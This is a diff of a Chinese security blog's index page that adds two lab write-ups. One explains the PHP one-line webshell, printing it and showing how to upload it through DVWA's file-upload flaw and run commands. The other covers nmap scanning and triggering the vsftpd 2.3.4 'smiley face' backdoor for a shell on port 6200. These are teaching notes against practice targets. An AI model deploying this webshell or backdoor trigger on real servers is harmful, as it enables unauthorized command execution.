@@ -71,6 +71,62 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-测试" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/blog/2026/07/27/%E6%B5%8B%E8%AF%95/" class="article-date">
+  <time class="dt-published" datetime="2026-07-27T12:47:00.000Z" itemprop="datePublished">2026-07-27</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/blog/2026/07/27/%E6%B5%8B%E8%AF%95/">测试</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>什么是一句话木马<br>一句话木马是指向目标网站注入一行代码，攻击者可以利用这行代码，接收并执行远程发送的任意命令，是一种精简、隐蔽的Web脚本。</p>
+<p>例如：</p>
+<?php system($_REQUEST ['cmd']);?>
+<p>Lobster AI<br>bash<br>这行代码通常被通过注入漏洞注入，或者写在文件里，利用文件上传漏洞上传到服务器。</p>
+<p>system函数可以用来执行命令并将相应的执行结果输出</p>
+<p>$_REQUEST [‘cmd’]获取用户提交的数据，cmd是攻击者要执行的命令，由攻击者传入。如果这句木马被保存在文件shell.php并上传到服务器，那么攻击者可以用类似以下命令进行攻击</p>
+<p>http:&#x2F;&#x2F;靶机IP地址&#x2F;shell.php?cmd&#x3D;ifconfig </p>
+<p>问号后面接要传入的参数， 比如指定命令为ifconfig，查询服务器ip。</p>
+<p>环境<br>靶机：Metasploitable2-Linux的DVWA</p>
+<p>攻击机：kali，windows</p>
+<p>网络环境：同一网段</p>
+<p><img src="/blog/%5Cblog%5Cimages%5Cpasted-1.png" alt="upload successful"></p>
+<p>构造shell.php<br>新建文件shell.php，写入代码</p>
+<?php system($_REQUEST ['cmd']);?>
+<p>Lobster AI<br>bash<br>上传shell.php<br>利用DVWA的文件上传漏洞把shell.php上传到服务器</p>
+<p>主机发现<br>kali查看自己ip</p>
+<p>nmap扫描同一网络下的主机</p>
+<p>很明显这个开着很多服务且没有做端口过滤的就是靶机，确定靶机ip 192.168.138.129</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://edfhh.github.io/blog/2026/07/27/%E6%B5%8B%E8%AF%95/" data-id="cuidr_EYUZewKprpJvHeUG1uM" data-title="测试" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-javasec靶场通关" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/blog/2026/07/27/javasec%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/" class="article-date">
@@ -674,6 +730,46 @@
 
 
   
+    <article id="post-test" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/blog/2026/07/27/test/" class="article-date">
+  <time class="dt-published" datetime="2026-07-27T05:17:21.000Z" itemprop="datePublished">2026-07-27</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/blog/2026/07/27/test/">test</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="一、基本概念"><a href="#一、基本概念" class="headerlink" title="一、基本概念"></a>一、基本概念</h1><p>1.1什么是漏洞？<br>1.2 常见漏洞扫描工具概述<br>二、理论基础<br>2.1 漏洞扫描概念<br>2.2 扫描类型分类<br>二、“笑脸漏洞”<br> 1.端口扫描：nmap -sV 192.168.153.133，识别端口上运行的网络服务及其具体版本信息<br> 2.使用 NSE 脚本检测后门（nmap –script ftp-vsftpd-backdoor -p 21 192.168.153.133 ，-p 21是为了直接查看21端口的后门漏洞，具有针对性，较省时间），可以快速检测目标 FTP 服务是否存在 VSFTPD 2.3.4 后门漏洞（图中显示获取shell的指令为id）​编辑<br> 3.使用命令 nmap -p9191 192.168.21.131 检测目标主机 6200 端口(vsFTPd 2.3.4后门常见于6200端口)的开放状态（当前检测结果显示为 closed 关闭状态）<br> 4.尝试“笑脸漏洞”（打开6200端口），上面扫描发现21端口是开放的，那我们从21端口入手，连接21端口，并输入“笑脸”：USER test:) （ ：）像一个笑脸，所以名为笑脸漏洞），然后随便输入一个PASS ：122，再点击ctrl + c退出当前指令<br> 5.检测下6200端口是否被打开，发现6200端口神奇的打开了<br> 6.那最后只需要连接6200端口并输入指令id便可以获取shell了<br>三、漏洞扫描-缓冲区溢出（以password.exe为例子）</p>
+<h2 id="一、基本概念-1"><a href="#一、基本概念-1" class="headerlink" title="一、基本概念"></a>一、基本概念</h2><p>1.1什么是漏洞？<br>漏洞（Vulnerability）指的是系统、软件或网络中存在的弱点，可能被攻击者利用来破坏系统安全。漏洞通常来自以下几类原因：<br>（1）软件错误：程序代码写错、输入校验不足、逻辑漏洞等。<br>（2）配置不当：端口暴露、权限设置过高、默认密码未修改。<br>（3）协议缺陷：如明文传输、缺少加密或验证机制。<br>（4）人为疏忽：弱密码、操作失误、安全意识不足。<br>正如著名计算机科学家 Edsger W. Dijkstra 说过：“编程就是不断制造错误的过程。”<br>软件越复杂，漏洞自然越多，因此漏洞扫描和安全检测显得尤为重要。<br>1.2 常见漏洞扫描工具概述<br>漏洞扫描工具可以帮助我们发现系统中的弱点，以下是常用的几类工具：<br>① OpenVAS<br>开源的综合漏洞扫描系统，适合对服务器和网络进行全方位检测。<br>② Nmap（含 NSE 脚本）<br>除了端口扫描外，Nmap 的脚本引擎可以检测弱口令、服务漏洞、配置问题等，是安全测试人员必备工具。<br>③ Netcat（nc）<br>被称为“网络界的瑞士军刀”，可用于端口连接、数据传输、测试后门等场景。<br>④ OWASP ZAP<br>适用于 Web 安全测试，可发现 SQL 注入、XSS、认证缺陷等常见 Web 漏洞。<br>二、理论基础<br>2.1 漏洞扫描概念<br>漏洞扫描是通过自动化工具对目标系统进行安全检测，识别已知安全弱点的过程。它与渗透测试的关系：<br>被动扫描：仅识别漏洞，不进行利用<br>主动扫描：可能包含验证性测试，但不超过破坏性界限<br>2.2 扫描类型分类<br>按目标分类：<br>├── 网络扫描（端口&#x2F;服务发现）<br>├── Web应用扫描<br>├── 数据库扫描<br>├── 操作系统扫描<br>└── 无线网络扫描<br>按认证方式：<br>├── 非认证扫描（外部视角）<br>└── 认证扫描（内部视角，需凭据）<br>二、“笑脸漏洞”<br> 1.端口扫描：nmap -sV 192.168.153.133，识别端口上运行的网络服务及其具体版本信息<br> 2.使用 NSE 脚本检测后门（nmap –script ftp-vsftpd-backdoor -p 21 192.168.153.133 ，-p 21是为了直接查看21端口的后门漏洞，具有针对性，较省时间），可以快速检测目标 FTP 服务是否存在 VSFTPD 2.3.4 后门漏洞（图中显示获取shell的指令为id）<br> 3.使用命令 nmap -p9191 192.168.21.131 检测目标主机 6200 端口(vsFTPd 2.3.4后门常见于6200端口)的开放状态（当前检测结果显示为 closed 关闭状态）<br> 4.尝试“笑脸漏洞”（打开6200端口），上面扫描发现21端口是开放的，那我们从21端口入手，连接21端口，并输入“笑脸”：USER test:) （ ：）像一个笑脸，所以名为笑脸漏洞），然后随便输入一个PASS ：122，再点击ctrl + c退出当前指令<br> 5.检测下6200端口是否被打开，发现6200端口神奇的打开了<br> 6.那最后只需要连接6200端口并输入指令id便可以获取shell了<br>补充：nc全称为NetCat，也叫做瑞士军刀，可用来连接端口等系列操作。<br>三、漏洞扫描-缓冲区溢出（以password.exe为例子）</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://edfhh.github.io/blog/2026/07/27/test/" data-id="cuid3wH7yFOHMSzdaGfM_dfd7" data-title="test" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
 
 
 </section>
@@ -726,11 +822,19 @@
       <ul>
         
           <li>
+            <a href="/blog/2026/07/27/%E6%B5%8B%E8%AF%95/">测试</a>
+          </li>
+        
+          <li>
             <a href="/blog/2026/07/27/javasec%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/">javasec靶场通关</a>
           </li>
         
           <li>
             <a href="/blog/2026/07/27/hello-world/">Hello World</a>
+          </li>
+        
+          <li>
+            <a href="/blog/2026/07/27/test/">test</a>
           </li>
         
       </ul>
